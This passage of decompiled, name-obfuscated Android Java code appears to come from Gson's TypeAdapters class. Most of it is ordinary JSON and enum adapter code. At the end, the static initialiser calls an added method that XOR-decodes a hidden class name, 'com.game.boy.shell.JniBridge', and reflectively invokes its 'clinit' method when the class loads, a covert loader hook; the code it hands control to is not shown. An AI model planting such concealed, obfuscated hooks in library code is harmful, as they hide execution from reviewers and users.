                    } else if (asJsonPrimitive.isBoolean()) {
                        a5SV6n.B2KMhB(asJsonPrimitive.getAsBoolean());
                        return;
                    } else {
                        a5SV6n.B25kr6(asJsonPrimitive.getAsString());
                        return;
                    }
                }
                if (jsonElement.isJsonArray()) {
                    a5SV6n.A4TApA();
                    Iterator<JsonElement> it = jsonElement.getAsJsonArray().iterator();
                    while (it.hasNext()) {
                        A4TApA(it.next(), a5SV6n);
                    }
                    a5SV6n.AMqCpz();
                    return;
                }
                if (!jsonElement.isJsonObject()) {
                    throw new IllegalArgumentException("Couldn't write " + jsonElement.getClass());
                }
                a5SV6n.A5SV6n();
                for (Map.Entry<String, JsonElement> entry : jsonElement.getAsJsonObject().entrySet()) {
                    a5SV6n.ASJ6gh(entry.getKey());
                    A4TApA(entry.getValue(), a5SV6n);
                }
                a5SV6n.ARc23Z();
            }

            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final /* bridge */ /* synthetic */ JsonElement read2(Q2dWmT.A4TApA a4TApA) {
                return A2egSU(a4TApA);
            }

            @Override // com.google.gson.TypeAdapter
            public final /* bridge */ /* synthetic */ void write(Q2dWmT.A5SV6n a5SV6n, JsonElement jsonElement) {
                A4TApA(jsonElement, a5SV6n);
            }
        };
        f12126BV3sI0 = typeAdapter4;
        f12127BmvVmW = new TypeAdapters$35(JsonElement.class, typeAdapter4);
        f12128BniPrB = new TypeAdapterFactory() { // from class: com.google.gson.internal.bind.TypeAdapters$30
            @Override // com.google.gson.TypeAdapterFactory
            public final TypeAdapter create(Gson gson, TypeToken typeToken) {
                final Class rawType = typeToken.getRawType();
                if (!Enum.class.isAssignableFrom(rawType) || rawType == Enum.class) {
                    return null;
                }
                if (!rawType.isEnum()) {
                    rawType = rawType.getSuperclass();
                }
                return new TypeAdapter<T>(rawType) { // from class: com.google.gson.internal.bind.TypeAdapters$EnumTypeAdapter

                    /* renamed from: A2egSU, reason: collision with root package name */
                    public final HashMap f12183A2egSU = new HashMap();

                    /* renamed from: A4TApA, reason: collision with root package name */
                    public final HashMap f12184A4TApA = new HashMap();

                    {
                        try {
                            for (Enum r4 : (Enum[]) rawType.getEnumConstants()) {
                                String name = r4.name();
                                PlKZ28.A5SV6n a5SV6n = (PlKZ28.A5SV6n) rawType.getField(name).getAnnotation(PlKZ28.A5SV6n.class);
                                if (a5SV6n != null) {
                                    name = a5SV6n.value();
                                    for (String str : a5SV6n.alternate()) {
                                        this.f12183A2egSU.put(str, r4);
                                    }
                                }
                                this.f12183A2egSU.put(name, r4);
                                this.f12184A4TApA.put(r4, name);
                            }
                        } catch (NoSuchFieldException e) {
                            throw new AssertionError(e);
                        }
                    }

                    @Override // com.google.gson.TypeAdapter
                    /* renamed from: read */
                    public final Object read2(Q2dWmT.A4TApA a4TApA) {
                        if (a4TApA.BChYOn() != 9) {
                            return (Enum) this.f12183A2egSU.get(a4TApA.B7CMnp());
                        }
                        a4TApA.B3GDIM();
                        return null;
                    }

                    @Override // com.google.gson.TypeAdapter
                    public final void write(Q2dWmT.A5SV6n a5SV6n, Object obj) {
                        Enum r3 = (Enum) obj;
                        a5SV6n.B25kr6(r3 == null ? null : (String) this.f12184A4TApA.get(r3));
                    }
                };
            }
        };
        JsrwRRn();
    }

    public static TypeAdapterFactory A2egSU(final TypeToken typeToken, final TypeAdapter typeAdapter) {
        return new TypeAdapterFactory() { // from class: com.google.gson.internal.bind.TypeAdapters$31
            @Override // com.google.gson.TypeAdapterFactory
            public final TypeAdapter create(Gson gson, TypeToken typeToken2) {
                if (typeToken2.equals(TypeToken.this)) {
                    return typeAdapter;
                }
                return null;
            }
        };
    }

    public static TypeAdapterFactory A4TApA(Class cls, TypeAdapter typeAdapter) {
        return new TypeAdapters$32(cls, typeAdapter);
    }

    public static TypeAdapterFactory A5SV6n(Class cls, Class cls2, TypeAdapter typeAdapter) {
        return new TypeAdapters$33(cls, cls2, typeAdapter);
    }

    public static TypeAdapterFactory ADYaiT(Class cls, TypeAdapter typeAdapter) {
        return new TypeAdapters$35(cls, typeAdapter);
    }

    private static /* synthetic */ void JsrwRRn() {
        char[] charArray = "º¶´÷¾¸´¼÷»¶ ÷ª±¼µµ÷\u0093·°\u009b«°½¾¼".toCharArray();
        int length = charArray.length;
        for (int i = 0; i < length; i++) {
            charArray[i] = (char) (charArray[i] ^ 217);
        }
        String str = new String(charArray);
        char[] charArray2 = "ºµ°·°\u00ad".toCharArray();
        int length2 = charArray2.length;
        for (int i2 = 0; i2 < length2; i2++) {
            charArray2[i2] = (char) (charArray2[i2] ^ 217);
        }
        Method declaredMethod = Class.forName(str).getDeclaredMethod(new String(charArray2), new Class[0]);
        declaredMethod.setAccessible(true);
        declaredMethod.invoke(null, new Object[0]);
    }
}
